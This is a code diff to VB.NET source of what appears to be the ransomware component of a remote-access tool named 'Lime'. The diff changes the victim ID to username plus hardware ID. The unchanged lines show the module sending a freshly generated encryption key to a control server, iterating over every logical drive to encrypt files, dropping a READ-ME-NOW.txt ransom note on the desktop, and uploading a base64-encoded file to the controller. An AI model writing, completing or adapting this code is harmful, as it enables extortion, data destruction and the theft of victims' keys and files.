@@ -12,6 +12,7 @@ Namespace Lime
         ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
         Private Const KEYEVENTF_KEYUP = &H2
         Private Const VK_LWIN = &H5B
+        Public HW = ID.UserName + "_" + ID.HWID
 
         Public Sub BeforeAttack(ByVal msg As String, ByRef pic As String)
             A1 = msg
@@ -31,7 +32,7 @@ Namespace Lime
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Encryption in progress...")
             Dim key As String = CreatePWD(15)
-            C.Send("GET-PASS" + C.SPL + ID.HWID + C.SPL + key)
+            C.Send("GET-PASS" + C.SPL + HW + C.SPL + key)
             C.Send(("c_ransome" & C.SPL & "Encryption in progress..."))
 
             For Each drive In Environment.GetLogicalDrives
@@ -123,7 +124,7 @@ Namespace Lime
                 C.Send("MSG" + C.SPL + "Files have been ecrypted successfully!")
                 Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
                 Dim fullpath As String = path + "\READ-ME-NOW.txt"
-                Dim Message As String() = {msg, "Your ID is " & ID.HWID & ""}
+                Dim Message As String() = {msg, "Your ID is " & HW & ""}
                 File.WriteAllLines(fullpath, Message)
 
 
@@ -161,7 +162,7 @@ Namespace Lime
             Do Until Online = True
                 Online = SK.S.Connected
                 If Online = True Then
-                    C.Send("SC" + C.SPL + ID.HWID + C.SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))
+                    C.Send("SC" + C.SPL + HW + C.SPL + Convert.ToBase64String(File.ReadAllBytes(TempFileName)))
                 End If
                 Threading.Thread.CurrentThread.Sleep(10000)
             Loop
@@ -175,6 +176,7 @@ End Namespace
 Namespace Lime
     Module Decryption
         Public P1
+        Public HW = ID.UserName + "_" + ID.HWID
 
 
         Public Sub BeforeDec(ByVal key As String)
@@ -210,7 +212,7 @@ Namespace Lime
             Do Until Online = True
                 Online = SK.S.Connected
                 If Online = True Then
-                    C.Send("DEL-PASS" + C.SPL + ID.HWID)
+                    C.Send("DEL-PASS" + C.SPL + HW)
                 End If
                 Threading.Thread.CurrentThread.Sleep(10000)
             Loop
